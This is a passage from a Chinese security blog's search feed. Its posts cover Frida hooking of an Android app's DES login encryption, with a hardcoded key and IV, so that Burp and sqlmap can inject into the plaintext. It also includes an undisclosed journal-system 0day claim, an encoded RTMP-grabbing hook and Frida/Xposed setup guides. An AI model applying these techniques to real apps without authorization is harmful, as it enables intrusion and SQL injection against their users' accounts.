BASE_DES_IV &#x3D; &quot;32028092&quot;;  &#x2F;&#x2F;字符串public static final String BASE_DES_KEY &#x3D; &quot;65102933&quot; &#x2F;&#x2F;字符串this.enCipher &#x3D; Cipher.getInstance(&quot;DES&#x2F;CBC&#x2F;PKCS5Padding&quot;);this.deCipher &#x3D; Cipher.getInstance(&quot;DES&#x2F;CBC&#x2F;PKCS5Padding&quot;);key:c3d26dca86259782bd9186481f892ae6       Hex byteiv:3332303238303932                          hex byte</code></pre><h2 id="使用工具模拟解密请求数据包"><a href="#使用工具模拟解密请求数据包" class="headerlink" title="使用工具模拟解密请求数据包"></a>使用工具模拟解密请求数据包</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131109046.png" alt="工具模拟解密加密数据"></p><h2 id="编写hook脚本在bp可以对明文进行修改"><a href="#编写hook脚本在bp可以对明文进行修改" class="headerlink" title="编写hook脚本在bp可以对明文进行修改"></a>编写hook脚本在bp可以对明文进行修改</h2>  <ul><li>既然先经过md5然后我们可以编写一个脚本让他经过bp来修改进行测试  参考脚本https://github.com/L3B1anc/simpleencrypt</li></ul>  <ul><li>修改一下我们  核心代码</li></ul>  <pre class="language-none"><code class="language-none">     send(string)      var op &#x3D; recv(function(value) &#123;    console.log(&quot;&lt;li&gt; js recv encryptdata content: &quot; + value);    string &#x3D;  value;&#125;);op.wait();    </code></pre>  <ul><li>hook.js    编写这个是重点注意 方法内修改属于值传递所以需要吧用户名和密码单独提取出来进行赋值修改  代码如截图</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131110884.png" alt="hook.js代码"><br>  <ul><li>frida_hook.py </li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131111483.png" alt="frida_hook.py"></p>  <ul><li>trace.py 脚本</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131113997.png" alt="trace.py"></p><h2 id="实战hook修改明文"><a href="#实战hook修改明文" class="headerlink" title="实战hook修改明文"></a>实战hook修改明文</h2>  <ul><li>启动frida  server  怎么安装和启动情况博客里面的教程。先运行frida-hook.py脚本 在运行trace.py脚本 </li></ul><ul><li>frida-hook.py 运行界面</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131114596.png"><br>  <ul><li>trace.py  运行界面</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131200366.png"><br>  <ul><li>配置好bp代理手机点击登录</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131202132.png" alt="bp代理配置"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131207335.png" alt="hook后数据截图"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131208424.png" alt="软件解密"></p>  <ul><li>这就可以测试了</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131209919.png" alt="bp测试"></p><h2 id="自动化对功能进行测试-frida-RPC主动调用"><a href="#自动化对功能进行测试-frida-RPC主动调用" class="headerlink" title="自动化对功能进行测试(frida  RPC主动调用)"></a>自动化对功能进行测试(frida  RPC主动调用)</h2>  <ul><li>如何进行自动化测试呢比如我用sqlmap 对用户名和密码进行测试如何进行。这时候就不用hook了我们使用rpc主动调用来测试执行。需要修改trace.py  增加python发包请求添加rpc主动调用  </li></ul>  <ul><li>firda开启远程监听模式</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131212809.png" alt="frida远程监听"></p>  <ul><li>修改后的trace.py代码截图  关键代码截图</li></ul>     <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131213141.png" alt="修改后的trace.py代码截图"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131214712.png" alt="运行trace.py"><br>  <ul><li>至此就可以任意进行测试了</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131215079.png" alt="自动化测试截图"></p>  <ul><li>完整代码以及测试app 内部放出</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131216648.png" alt="完整代码以及测试app"></p>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChatGpt使用和注册|ChatGpt-C#客户端</title>
      <link href="/chatgpt/2023/02/articles/5f434729a12aeff4/"/>
      <url>/chatgpt/2023/02/articles/5f434729a12aeff4/</url>
      
        <content type="html"><![CDATA[<h1 id="ChatGpt注册"><a href="#ChatGpt注册" class="headerlink" title="ChatGpt注册"></a>ChatGpt注册</h1> <ul><li>参考文章:https://baijiahao.baidu.com/s?id=1757224229351914188&wfr=spider&for=pc</li></ul><h2 id="ChatGpt客户端使用"><a href="#ChatGpt客户端使用" class="headerlink" title="ChatGpt客户端使用"></a>ChatGpt客户端使用</h2>  <ul><li>注册好了然后去网站生成apikey然后打开软件的ChatGPTCS.exe.config 里面的value="你申请的key"</li></ul>  <h2 id="ChatGpt演示使用"><a href="#ChatGpt演示使用" class="headerlink" title="ChatGpt演示使用"></a>ChatGpt演示使用</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302081326727.png" alt="ChatGpt演示"></p><h2 id="ChatGpt下载"><a href="#ChatGpt下载" class="headerlink" title="ChatGpt下载"></a>ChatGpt下载</h2>  <ul><li>下载地址:https://t.me/SoftwareUpdateChannel/61</li></ul>]]></content>
      
      
      <categories>
          
          <category> ChatGpt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>北京勤云期刊0day漏洞-可shell</title>
      <link href="/0day/2023/02/articles/51b7e07325d69b2b/"/>
      <url>/0day/2023/02/articles/51b7e07325d69b2b/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>北京勤云科技发展有限公司 期刊采编系统、编辑部办公系统、编辑部办公自动化、网刊发布系统、远程审稿系统、远程投稿系统、读者订阅系统、期刊搜索、勤云软件、期刊办公自动化。</p><h2 id="漏洞截图"><a href="#漏洞截图" class="headerlink" title="漏洞截图"></a>漏洞截图</h2><p>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061656585.png" alt="漏洞截图1"></p><p>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061657368.png" alt="漏洞截图2"></p><h2 id="源码截图"><a href="#源码截图" class="headerlink" title="源码截图"></a>源码截图</h2><p>   <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061719127.png" alt="源码截图"></p><h2 id="是否博主独立挖掘"><a href="#是否博主独立挖掘" class="headerlink" title="是否博主独立挖掘"></a>是否博主独立挖掘</h2><pre><code><pre class="language-none"><code class="language-none">   是</code></pre></code></pre><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><pre><code> <pre class="language-none"><code class="language-none"> 非公开 </code></pre></code></pre>]]></content>
      
      
      <categories>
          
          <category> 0day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> 0day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>直播app 获取rtmp播放地址-腾讯播放器Frida-hook</title>
      <link href="/androidreverse/2023/01/articles/b9d040d0979b56be/"/>
      <url>/androidreverse/2023/01/articles/b9d040d0979b56be/</url>
      
        <content type="html"><![CDATA[<h1 id="分析app"><a href="#分析app" class="headerlink" title="分析app"></a>分析app</h1><ul><li>把app放到jadx 里面找到包名如下图<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101543624.png"></li><li>找到图片里面的方法<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101544176.png"></li><li>Hook图片里面的方法<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101545128.png"></li></ul><h2 id="hook代码"><a href="#hook代码" class="headerlink" title="hook代码"></a>hook代码</h2>   <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">FoVplMzAwMTQ5NTI3ZTcyZTE0NzQ1YjUxMTUzZTgyNGE0ZmQ1Zjk0Yjg3Zjk4YjRmZWZmNTBhOGU4NGY0Y2YzMjk0OGRmNGM0NTM5MzA5ZWMwODlhYjExZDdiNWQ5MDhhZjNhMzg5NTJiNzJlOTRiNWM1YTEwYmY0Mzc4ZDJkMzcyYTQ0MjUzZjdlNjI1MDQ0Y2RjMTFlNjFmOTU1NGI3MTRkNWRiYzIwMzk0MGJhNGE4ZTNmYzZkYWU2ZTJmM2M3MThmOGU5ZWViZTRkNjNlZDMwZjJmZjRiYzViMzE3MmI1ZDE3NzI5ZTkyNmQ5NmUyYWYxMDFjZDhjOGQ3NDExNTQ4MWUxOTI1ZjA5YTVkODk2NzNhNDcwY2U3MjRjNTNkYzk1ZGUyMDFkNzNlNDAyODhmMTVmYmNkODM2YWM2Y2MyYWNiNGM4ZWFjNmFkYzM1NjA3ZWRlMmM0NmZmYzlkM2EwMDY2ZGExMTU4MTE4MTFhYTNmZjFlYTZkYzAxNTg4NTJhMjE4NTNiN2RlZjcyYjRkZmJjMzZlYjliMDk5NmYwZWM3YWIyOTU1M2Q0YTQzNWEwYWQxMTg1MTQ0NmVlOTBiNTgxYzYzNjExY2IxZjZhYTg2MWMxZDcxNzBkYjQ4NWQ1ZjI5ZmMyOWNlNjAwZWM4YTJjZjliZDk2NDUxM2I2YmVhNzhjMzk1MmEwY2UwN2ZiZmMyZmE0YmQyYzAzNmM0YmViMDgzMTBiYjU0NTJmMzM5NTE2NWY4Y2QxYjdmMWYyMmE3NzFlN2U1MWNmNzA1NzYxOTgyOTM5N2ZkNDYwODQ0MzNjMzYyMDlhODAyMGFlOGMxYTc0NDhmNzUzNGRlNGNiZjE5ZWM0ZDRiYTdmMTY0YzkyN2RlMWI0NTJjZjJmZDZkNjViMTg0NDdmY2I5NzBlNDAyYTdiZmU4NmMzMDdhYmM2OWU4ZGMzNmNkYzY4YjEwNmZlMjljMmJlMTlkNGFlZGRmN2QxNDcyNzEyZDhmMmM4Yjk1YjZlZTIzZDU4ZjdhYjhkODhhNDA4OTRlOWUwODU0MDM3ZTMxYzk2ZjlhNmE4Y2M5MzMwNDQ3M2RjOWY3NTZlNTU0OGZmZTU1MDQ4YjA5YzVkOWFkYzBiMDhiODRkMWQ1NDM2MzcwMmUxYmQzMDY2ZTMxZTQwYmJjNDMxYjVmMWY0YzhlYTkzNmQ0OTE0MmJkNDQ4ZDRkYzdlNjZhZDFiYjIwMDE4ZGIzY2YyMzUxMTgzOWM1Zjc0MmZhZGY0NDMyYzllZjRjOWU2Py   </code></pre><ul><li>效果(当然得有一定的frida使用基础)<br>   <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101549477.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> Frida </tag>
            
            <tag> Vip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FriDa安装</title>
      <link href="/androidreverse/2023/01/articles/a94394783b10c35a/"/>
      <url>/androidreverse/2023/01/articles/a94394783b10c35a/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Frida 是一款基于 Python + JavaScript 的 Hook 与调试框架。<br>Firda 是一款易用的跨平 Hook 工具， Java 层到 Native 层的 Hook 无所不能，是一种 动态 的插桩工具，可以插入代码到原生 App 的内存空间中，动态的去监视和修改行为，原生平台包括 Win、Mac、Linux、Android、iOS 全平台。静态二进制插桩：在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件。动态二进制插桩：在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。</p><h2 id="frida和安卓平台以及python环境关系介绍"><a href="#frida和安卓平台以及python环境关系介绍" class="headerlink" title="frida和安卓平台以及python环境关系介绍"></a>frida和安卓平台以及python环境关系介绍</h2><ul><li><p>由于frida基于python所以要安装python环境。不同版本的frida应用版本也不同例如:</p><ul><li>frida12.3.6 Android5-6 Python3.7 </li><li>frida12.8.0 Android7-8 Python3.8 </li><li>frida14+  Android9+ Python3.8</li></ul></li></ul><h2 id="python环境安装"><a href="#python环境安装" class="headerlink" title="python环境安装"></a>python环境安装</h2><ul><li><p>由于安卓版本不同我用的安卓是安卓10所以安装的python版本是 3.8以上的版本</p><ul><li><p><a href="https://www.python.org/downloads/">python官方网站下载</a><br> 如下图直接选择python3.8.6下载即可<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261942355.png" alt="python下载截图"></p></li><li><p><a href="https://www.cnblogs.com/lvtaohome/p/11121377.html">python安装参考文章太简单我就不演示了</a>注意要把python加入系统环境变量中</p></li><li><p>安装成功标志 如下图:<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261946578.png" alt="python安装成功标志"></p></li></ul></li></ul><h2 id="frida下载和安装-pc客户端"><a href="#frida下载和安装-pc客户端" class="headerlink" title="frida下载和安装(pc客户端)"></a>frida下载和安装(pc客户端)</h2><ul><li><p>python安装frida pip install frida  这样安装默认安装最新版本如果想指定版本安装那么到<a href="https://github.com/frida/frida/releases/">https://github.com/frida/frida/releases/</a> 查看版本号安安装例如<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261952214.png" alt="frida版本查看"> pip install frida&#x3D;&#x3D;15.1.17   其他版本的话把15.1.17替换一下就行了我就按最新版本来说了</p></li><li><p>安装frida-tools 下图 pip install frida-tools&#x3D;&#x3D;10.5.4<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261959609.png" alt="frida-tools版本">  </p></li><li><p>注意frida版本一定要和frida-tools对应 即15.1.7 对应的frida-tools版本是 10.5.4。卸载的话把install改成uninstall即可 pip uninstall frida-tools&#x3D;&#x3D;10.5.4</p></li><li><p>验证frida 是否安装成功标志如下图 frida –v  import frida  没有报错说明安卓成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262015412.png" alt="验证是否成功"></p></li></ul><h2 id="frida下载和安装-也就是安卓端服务端"><a href="#frida下载和安装-也就是安卓端服务端" class="headerlink" title="frida下载和安装(也就是安卓端服务端)"></a>frida下载和安装(也就是安卓端服务端)</h2><ul><li><p>首先确定手机的型号(adb shell getprop ro.product.cpu.abi) 然后在frida搜索一下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262006695.png" alt="确定手机型号"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262010155.png" alt="下载"></p></li><li><p>下载完毕解压然后使用推送adb push xxxxx &#x2F;data&#x2F;local&#x2F;tmp 目录下。然后改名并且赋予执行权限 chomd 777 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;fsarm64<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301081646285.png" alt="推送"></p></li><li><p>启动sever .&#x2F;fsarm64 没有报错说明成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262017158.png" alt="没有报错成功"></p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>至此frida安装完毕。上面涉及adb 这些和手机型号我这里用的是Pixel 一代 安卓10 某宝网站有卖 可以自行购买。下课。后续我还会发表相关教程</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>夜神模拟器 7.0 安卓 64位安装 Xposed-并且激活</title>
      <link href="/androidreverse/2023/01/articles/6a83169aaad6252d/"/>
      <url>/androidreverse/2023/01/articles/6a83169aaad6252d/</url>
      
        <content type="html"><![CDATA[<h1 id="Xposed下载"><a href="#Xposed下载" class="headerlink" title="Xposed下载"></a>Xposed下载</h1><p>xposed下载地址:<a href="https://github.com/youling257/XposedTools/files/1931996/xposed-x86_64.zip,%E8%A7%A3%E5%8E%8B%E5%88%9B%E5%BB%BAxposed,system%E6%96%87%E4%BB%B6%E5%A4%B9">https://github.com/youling257/XposedTools/files/1931996/xposed-x86_64.zip,解压创建xposed,system文件夹</a> 并且把压缩包文件拷贝到system文件夹拷贝到 xposed下面并且把scrip.sh脚本拷贝到xposed里面</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101236058.png" alt="把script.sh拷贝到xposed里面"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101241884.png"></p><p>然后打包压缩。</p><h2 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h2><ul><li><p>开启模拟器的usb调试模式。来到设置-关于平板电脑如下图</p><ul><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101244494.png" alt="来到关于平板电脑"></p></li><li><p>来到版本号点击5次进入usb调试模式如下图</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101246784.png" alt="进入usb调试模式"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101247342.PNG" alt="点击5次进去调试模式"></p></li><li><p>进去夜神模拟器安装目录。查看模拟器端口</p></li><li><p>adb devices</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101250569.png"></p></li><li><p>拷贝xposed.zip  到模拟器&#x2F;system&#x2F; 文件夹。执行下面两个命令赋予权限</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101251864.png"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101252395.png"></p></li><li><p>进入模拟器查看解压文件 </p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101253452.png"></p></li><li><p>解压</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101254749.png"></p></li><li><p>切换到xposed文件夹下。</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101255910.png"></p></li></ul></li></ul><h2 id="在模拟器里面安装xposed"><a href="#在模拟器里面安装xposed" class="headerlink" title="在模拟器里面安装xposed"></a>在模拟器里面安装xposed</h2><ul><li>运行脚本<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101257021.png"></li></ul></li><li>拷贝xposed安装包<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101258737.png"></li></ul></li><li>在执行一次脚本<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101258643.png"></li></ul></li><li>重启模拟器<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101259605.png"></li></ul></li><li>出现下图这个在重启一次<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101300896.png"></li></ul></li><li>出现下图继续重启<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101301634.png"></li></ul></li><li>再次重启已经激活<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101301475.png"></li></ul></li><li>接下来就可以安装xposed插件了如下图<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101303608.png"></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xposed </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
